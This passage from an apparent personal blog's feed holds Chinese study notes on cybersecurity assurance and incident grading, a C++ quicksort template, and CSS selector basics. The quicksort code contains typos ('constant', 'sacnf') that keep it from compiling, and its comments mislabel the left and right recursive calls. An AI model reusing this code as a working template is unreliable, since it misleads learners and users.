id="三、网络空间安全保障工作方法"><a href="#三、网络空间安全保障工作方法" class="headerlink" title="三、网络空间安全保障工作方法"></a>三、网络空间安全保障工作方法</h2><ol><li><h3 id="确定网络空间安全保障需求"><a href="#确定网络空间安全保障需求" class="headerlink" title="确定网络空间安全保障需求"></a>确定网络空间安全保障需求</h3></li></ol><ul><li>三个方面<ul><li>法规符合性</li><li>符合业务需求</li><li>风险评估结果</li></ul></li><li>标准化安全保障需求文档<ul><li>ＩＳＰＰ　（信息系统保障轮廓）</li><li>从&#x3D;&#x3D;所有者&#x3D;&#x3D;的角度规范化</li></ul></li><li>表达目的和要求</li></ul><ol><li><h3 id="设置并实施网络空间安全保障方案"><a href="#设置并实施网络空间安全保障方案" class="headerlink" title="设置并实施网络空间安全保障方案"></a>设置并实施网络空间安全保障方案</h3></li></ol><ul><li>以风险评估和法规要求得出的安全需求为依据</li><li>有可实施性（成本　进度　技术　组织管理和文化）</li><li>信息系统安全目标（ISST）<ul><li>（ISST）是根据信息系统保护轮廓 （ISPP）编制的信息系统安全保障方案</li><li>ISST从信息系统安全保障的&#x3D;&#x3D;建设方（厂商）&#x3D;&#x3D;的角 度制定的信息系统安全保障方案</li></ul></li></ul><ol><li><h3 id="网络空间安全测评"><a href="#网络空间安全测评" class="headerlink" title="网络空间安全测评"></a>网络空间安全测评</h3></li></ol><ul><li><p><img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020085127865.png" alt="image-20231020085127865"></p></li><li><p>GB&#x2F;T 18336系列标准</p></li><li><p>信息系统安全测评标准是GB&#x2F;T20274 《信息系统安全保障 评估框架》</p></li><li><p>技术 过程 管理 人员</p></li><li><h4 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h4><ul><li>计算机安全事件：<ul><li>计算机安全事件是指由于自然或者人为， 以及软硬件本身缺陷或故障的原因，对 信息系统造成危害，或者在信息系统内 发生对社会造成负面影响的事件。</li><li>比如：非授权访问 拒绝服务攻击  不当使用 复合型安全事件 恶意代码等</li></ul></li><li>定义：通常是指一个组织为了应对各种意 外事件的发生所做的准备以及在事 件发生后所采取的措施。</li><li>意义：&#x3D;&#x3D;第一、未雨绸缪，第二、亡羊补牢&#x3D;&#x3D;</li><li>事件分级分类<ul><li>分类</li><li><img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020093629584.png" alt="image-20231020093629584"></li><li><img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020093637906.png" alt="image-20231020093637906"></li><li>分级：</li><li>&#x3D;&#x3D;四级&#x2F;一般&#x3D;&#x3D; 安全事件未造成业务中断，或中断时间少于10分钟，并且未造成业务系统 数据损坏、丢失。例如，误操作加入了一项访问控制列表，造成业务系统 暂时无法访问，及时发现并进行了恢复。</li><li>&#x3D;&#x3D;三级&#x2F;较大&#x3D;&#x3D; 安全事件造成业务中断或间断，中断时间10-30分钟，并且未造成业务系 统数据损坏、丢失。例如，蠕虫病毒造成局部网络拥塞，未对数据破坏， 及时进行了防毒与恢复</li><li>&#x3D;&#x3D;二级&#x2F;重大&#x3D;&#x3D; 安全事件造成业务中断或间断时间在30-60分钟，或者业务系统数据部分损坏、 丢失，可以通过备份进行恢复。例如，某服务器被入侵后，系统数据被删除， 被删除数据有备份。</li><li>&#x3D;&#x3D;一级&#x2F;特别重大&#x3D;&#x3D; 安全事件造成业务中断或间断时间在60分钟以上，或者业务系统数据损坏、丢 失，并且无法恢复，或者重要数据泄露，或者业务系统或网络被破坏或损坏， 并且预计在60分钟内无法恢复。安全事件造成一级敏感数据泄漏。 </li><li>&#x3D;&#x3D;特殊时期（如重大活动、重大赛事等）发生的安全事件的级别应在 原有级别上提升一级，特别重大安全事件级别不再向上提升&#x3D;&#x3D;</li></ul></li><li>应急流程<ul><li><img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020093906769.png" alt="image-20231020093906769"><ul><li>跟进阶段：<ul><li>&#x3D;&#x3D;从安全事件中吸取经验教训非常关键&#x3D;&#x3D;，不停的自我完善的防护 体系和策略才是最好的安全设计思路。</li><li>将&#x3D;&#x3D;每次安全事故的表现和处理步骤发布&#x3D;&#x3D;在内部的信息安全发布站点上，方便以后内部出现同样攻击事件后处理。  </li><li>对于内部&#x3D;&#x3D;需要改善和做出调整的安全配置&#x3D;&#x3D;在内部网络中&#x3D;&#x3D;及时发布更新策略&#x3D;&#x3D;。</li></ul></li></ul></li></ul></li><li>病毒分类：<ul><li>勒索病毒<ul><li>感染时间：操作系统，</li><li>感染文件特征：文件类型，文件后缀</li><li>未被感染主机：<img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020095307340.png" alt="image-20231020095307340"></li><li>被感染主机：对被感染主机进行隔离处置，禁止在被感染主机上使用U盘、移动硬盘</li></ul></li><li>挖矿木马</li><li>远控木马</li><li>普通木马</li></ul></li></ul></li></ul><p><img src="/2023/10/09/%E7%BD%91%E5%AE%89%E4%BF%9D%E9%9A%9C/image-20231020095340063.png" alt="image-20231020095340063"></p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安保障 </tag>
            
            <tag> 网安技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重点知识掌握</title>
      <link href="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/"/>
      <url>/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/10/09/%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E6%8E%8C%E6%8F%A1/image-20231009085053451.png" alt="image-20231009085053451"></p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安技术 </tag>
            
            <tag> 章节重点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快排</title>
      <link href="/2023/10/08/%E5%BF%AB%E6%8E%92/"/>
      <url>/2023/10/08/%E5%BF%AB%E6%8E%92/</url>
      
        <content type="html"><![CDATA[<h1 id="快排思想"><a href="#快排思想" class="headerlink" title="快排思想"></a>快排思想</h1><ul><li>分治</li><li>确定分界点：<code>q[l],q[r],q[(r+l)/2] 或随机</code></li><li>调整区间***：右边全部&lt;&#x3D;x;左边全部&gt;&#x3D;x</li><li>递归处理左边和右边</li></ul><h1 id="调整区间"><a href="#调整区间" class="headerlink" title="调整区间"></a>调整区间</h1><ul><li>暴力求解：额外开辟两个数组用来存放q中大于等于x的和小于等于x的</li><li>双指针：保证i指针左边（不包括i）所有数小于等于x；j指针右边（不包括j）所有数大于等于x</li></ul><h1 id="快排模板"><a href="#快排模板" class="headerlink" title="快排模板"></a>快排模板</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">constant <span class="type">int</span> N =<span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> x = q[l], i=l<span class="number">-1</span>, j=r+<span class="number">1</span>; <span class="comment">//设定超出边界值的指针,后续先移动再比较</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i++; <span class="keyword">while</span>(q[i]&lt;x);</span><br><span class="line">        <span class="keyword">do</span> j--; <span class="keyword">while</span>(q[j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span> (i&lt;j) <span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">        <span class="comment">/*&#123;</span></span><br><span class="line"><span class="comment">            int t=q[i];</span></span><br><span class="line"><span class="comment">            q[i] = q[j];</span></span><br><span class="line"><span class="comment">            q[j] = t;</span></span><br><span class="line"><span class="comment">        &#125;*/</span> <span class="comment">//没有swap函数的时候</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">quick_sort</span>(q,l,j);<span class="comment">//右边</span></span><br><span class="line">    <span class="built_in">quick_sort</span>(q,j+<span class="number">1</span>,r);<span class="comment">//左边</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">sacnf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;n;i ++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>理解：此算法并没有按照教材中显示的不停用边界值交换，这减少了交换的次数，也表示出，最终一轮迭代结束后，分界线处不一定是边界值</p><p>可行原因：两句dowhile表明：i（不包含i）的左侧一定&lt;x；j（不包含j）的右侧一定&gt;x；后面的swap能够保证此时的i&lt;&#x3D;x，j&gt;&#x3D;x，这也让循环中下一次先do有了条件，do了以后又满足本段第一行条件（两句…）。</p><p>递归边界的理解：当大while结束以后，i&gt;&#x3D;j（323i&gt;j）</p><p>​用j：递归右边（大于等于x）j的右侧不能包含i，取j+1</p><p>​同理，用i：递归左边不能包含j，取i-1</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法学习，蓝桥杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝桥杯，排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Css基础</title>
      <link href="/2023/09/29/Css%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/29/Css%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><h4 id="1、行内式"><a href="#1、行内式" class="headerlink" title="1、行内式"></a>1、行内式</h4><blockquote><p>直接写在HTML标签的后面，再通过标签属性style来引入的</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span> =<span class="string">&#x27;width:200px;&#x27;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2、内嵌式"><a href="#2、内嵌式" class="headerlink" title="2、内嵌式"></a>2、内嵌式</h4><blockquote><p>将css代码单独放在一个style标签中，然后通过css<a href="https://so.csdn.net/so/search?q=%E9%80%89%E6%8B%A9%E5%99%A8&spm=1001.2101.3001.7020">选择器</a>来选择HTML元素</p></blockquote><ul><li>语法：选择器{属性名：属性值}</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> //放在head中，放在title下面</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">div</span>&#123;<span class="attribute">color</span>:red;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、外链式（最常用）"><a href="#3、外链式（最常用）" class="headerlink" title="3、外链式（最常用）"></a>3、外链式（最常用）</h4><blockquote><p>将css代码单独的放在一个文件中，再通过link标签引入</p></blockquote><ul><li>link标签<ul><li>rel &#x3D; ‘stylesheet’ 样式表，不可缺少</li><li>href &#x3D; ‘style.css’ 样式表的地址、路径</li><li>type &#x3D; ‘text&#x2F;css’ 类型，可以省略不写</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;link rel = &#x27;stylesheet&#x27; href = &#x27;style.css&#x27; type = &#x27;text/css&#x27;&gt;</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="4、导入式-了解就可以，没有用到过"><a href="#4、导入式-了解就可以，没有用到过" class="headerlink" title="4、导入式(了解就可以，没有用到过)"></a>4、导入式(了解就可以，没有用到过)</h4><blockquote><p>将CSS代码单独放在一个文件中，再通过style标签进行引入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">  @import &#x27;地址&#x27;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><ul><li><p>推荐在head当中使用link的方式引入css</p></li><li><p>import方式要写在style的第一行</p></li></ul><h1 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h1><h3 id="1-三类选择器"><a href="#1-三类选择器" class="headerlink" title="1. 三类选择器"></a>1. 三类选择器</h3><ul><li><h4 id="基础选择器"><a href="#基础选择器" class="headerlink" title="基础选择器"></a>基础选择器</h4><ul><li><p>元素选择器——一组元素</p><ul><li>同一元素可以多个类</li><li>h1.red——&gt;class&#x3D;red（vscode语法）</li><li>h1#red——&gt;id&#x3D;red</li></ul></li><li><p>类选择器——class</p><ul><li>伪类选择器，描述不同状态【标签：伪类】</li><li><a href="https://www.w3school.com.cn/tiy/t.asp?f=css_link_1">W3School TIY Editor</a></li></ul></li><li><p>id选择器</p></li><li><p>通篇符选择器</p><ul><li>对网页中的所有元素设定</li><li>初始化网页布局会用到</li></ul></li><li><p>属性选择器</p><ul><li><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927203130255.png" alt="image-20230927203130255"></li></ul></li><li><p>示例代码：</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS 选择器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: blanchedalmond;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellowgreen;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellow;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.black</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pink</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:deeppink;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.red</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:red;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.bold</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">800</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#lg</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:turquoise;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href]</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:aqua;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href*=<span class="string">&quot;edu.cn&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:chocolate;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[href$=<span class="string">&quot;.com&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>:<span class="number">200%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class~=<span class="string">&quot;border&quot;</span>]</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>:yellowgreen;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        &lt;!-- 这条规则不会生效 --&gt;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class|=<span class="string">&quot;border&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-attr">[class |=<span class="string">&quot;dash&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: <span class="number">900</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CSS选择器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>css选择器分为两类<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.基础选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2.符合选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>基础选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.1 元素选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.2 类选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.3 ID选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4 属性选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.5 全局选择器<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.1 元素选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>根据元素的标记名选择<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>&gt;</span>新浪<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.2 类选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;black&quot;</span>&gt;</span>黑色字体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;red&quot;</span>&gt;</span>红色字体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pink&quot;</span>&gt;</span>粉红色<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>粗体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>我们通过类可以设定预设的样式<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.3 ID选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>通过ID选择器可以唯一选定一个元素<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;lg&quot;</span>&gt;</span>我是ID选择器<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>需要确保id值是唯一的<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.4 属性选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>基本用法：[属性=“属性值”]<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>但是还有很多六种变种：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.1 [属性名]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.2 [属性名*=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.3 [属性名^=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.4 [属性名$=&quot;属性值部分字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.5 [属性名~=&quot;多个属性值的某个属性值&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.4.6 [属性名|=&quot;-设定属性的前面字符串&quot;]<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span>&gt;</span>四川大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.uestc.edu.cn&quot;</span>&gt;</span>电子科技大学<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.wiki.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;border dash&quot;</span>&gt;</span>维基<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dash-border&quot;</span>&gt;</span>属性测试<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1.5 *：通用或全局选择器<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>&quot;*&quot;选择器用于选择页面中的全部元素，一般不独立使用<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>一般用在组合选择器中，和其他选择器组合使用<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><h4 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h4><ul><li>交选择器<ul><li>h1.class</li><li>h1#id</li></ul></li><li>并选择器<ul><li>标签一，标签二</li></ul></li></ul></li><li><h4 id="位置选择器"><a href="#位置选择器" class="headerlink" title="位置选择器"></a>位置选择器</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204118013.png" alt="image-20230927204118013"></p><p>标签二是一的后代标签，全部</p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204203931.png" alt="image-20230927204203931"></p><p>标签2是标签1的儿子节点</p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927204317615.png" alt="image-20230927204317615"></p></li><li><p>兄弟选择节点，相邻节点——p+p，p的所有相邻p节点</p><ul><li><p>相邻兄弟只会影响下面的p标签的样式，不影响上面兄弟的样式。</p></li><li><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    li + li &#123;        color:red;    &#125;&lt;/style&gt;&lt;div&gt;  &lt;ul&gt;    &lt;li&gt;List item 1&lt;/li&gt;    &lt;li&gt;List item 2&lt;/li&gt;    &lt;li&gt;List item 3&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;</code></pre></li></ul></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/20200819151017875.png#pic_center" alt="![图片描述][1]"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927205517625.png" alt="image-20230927205517625"></p><p>不一定是紧邻</p></li></ul></li></ul><h3 id="2-css常见申明"><a href="#2-css常见申明" class="headerlink" title="2. css常见申明"></a>2. css常见申明</h3><h4 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927205938144.png" alt="image-20230927205938144"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927210044556.png" 